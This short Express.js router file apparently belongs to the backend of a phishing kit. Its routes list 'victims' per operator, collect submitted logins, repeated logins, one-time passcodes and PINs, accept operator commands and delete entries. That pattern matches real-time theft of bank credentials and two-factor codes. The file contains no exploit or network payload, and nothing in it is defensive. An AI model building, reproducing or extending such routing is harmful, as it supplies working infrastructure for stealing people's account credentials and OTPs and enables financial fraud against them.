const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitOtp,
    submitPin,
    deleteEntry,
} = require("../controllers/peopleController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/pin", submitPin);
router.post("/delete", deleteEntry);

module.exports = router;
